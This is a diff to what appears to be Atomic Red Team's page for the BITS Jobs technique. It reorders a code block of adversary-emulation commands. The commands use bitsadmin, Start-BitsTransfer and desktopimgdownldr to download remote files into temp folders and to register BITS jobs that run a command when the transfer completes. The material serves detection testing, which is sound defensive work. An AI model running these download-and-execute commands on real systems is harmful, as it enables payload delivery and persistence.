@@ -34,49 +34,36 @@ BITS upload functionalities can also be used to perform [Exfiltration Over Alter
 
 ```
 bitsadmin.exe /transfer /Download /priority Foreground https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md #{local_file}
-
-bitsadmin.exe /transfer /Download /priority Foreground #{remote_file} %temp%\bitsadmin1_flag.ps1
-
-Start-BitsTransfer -Priority foreground -Source https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md -Destination #{local_file}
-
-Start-BitsTransfer -Priority foreground -Source #{remote_file} -Destination $env:TEMP\bitsadmin2_flag.ps1
-
-bitsadmin.exe /create #{bits_job_name}
-bitsadmin.exe /addfile #{bits_job_name} #{remote_file} #{local_file}
-bitsadmin.exe /setnotifycmdline #{bits_job_name} C:\Windows\system32\notepad.exe ""
-bitsadmin.exe /resume #{bits_job_name}
-timeout 5
-bitsadmin.exe /complete #{bits_job_name}
-
 bitsadmin.exe /create AtomicBITS
 bitsadmin.exe /addfile AtomicBITS #{remote_file} #{local_file}
 bitsadmin.exe /setnotifycmdline AtomicBITS #{command_path} ""
 bitsadmin.exe /resume AtomicBITS
 timeout 5
 bitsadmin.exe /complete AtomicBITS
-
+Start-BitsTransfer -Priority foreground -Source #{remote_file} -Destination $env:TEMP\bitsadmin2_flag.ps1
+Start-BitsTransfer -Priority foreground -Source https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md -Destination #{local_file}
+set "#{download_path}" && cmd /c desktopimgdownldr.exe /lockscreenurl:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md /eventName:desktopimgdownldr
 bitsadmin.exe /create #{bits_job_name}
-bitsadmin.exe /addfile #{bits_job_name} #{remote_file} %temp%\bitsadmin3_flag.ps1
-bitsadmin.exe /setnotifycmdline #{bits_job_name} #{command_path} ""
+bitsadmin.exe /addfile #{bits_job_name} #{remote_file} #{local_file}
+bitsadmin.exe /setnotifycmdline #{bits_job_name} C:\Windows\system32\notepad.exe ""
 bitsadmin.exe /resume #{bits_job_name}
 timeout 5
 bitsadmin.exe /complete #{bits_job_name}
-
+bitsadmin.exe /transfer /Download /priority Foreground #{remote_file} %temp%\bitsadmin1_flag.ps1
+set "SYSTEMROOT=C:\Windows\Temp" && cmd /c desktopimgdownldr.exe /lockscreenurl:#{remote_file} /eventName:desktopimgdownldr
+set "#{download_path}" && cmd /c desktopimgdownldr.exe /lockscreenurl:#{remote_file} /eventName:desktopimgdownldr
 bitsadmin.exe /create #{bits_job_name}
 bitsadmin.exe /addfile #{bits_job_name} https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md #{local_file}
 bitsadmin.exe /setnotifycmdline #{bits_job_name} #{command_path} ""
 bitsadmin.exe /resume #{bits_job_name}
 timeout 5
 bitsadmin.exe /complete #{bits_job_name}
-
-set "#{download_path}" && cmd /c desktopimgdownldr.exe /lockscreenurl:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md /eventName:desktopimgdownldr
-
-set "SYSTEMROOT=C:\Windows\Temp" && cmd /c desktopimgdownldr.exe /lockscreenurl:#{remote_file} /eventName:desktopimgdownldr
-
-set "#{download_path}" && cmd /c desktopimgdownldr.exe /lockscreenurl:#{remote_file} /eventName:desktopimgdownldr
-
-set "#{download_path}" && cmd /c desktopimgdownldr.exe /lockscreenurl:#{remote_file} /eventName:desktopimgdownldr
-
+bitsadmin.exe /create #{bits_job_name}
+bitsadmin.exe /addfile #{bits_job_name} #{remote_file} %temp%\bitsadmin3_flag.ps1
+bitsadmin.exe /setnotifycmdline #{bits_job_name} #{command_path} ""
+bitsadmin.exe /resume #{bits_job_name}
+timeout 5
+bitsadmin.exe /complete #{bits_job_name}
 bitsadmin.exe
 ```
 
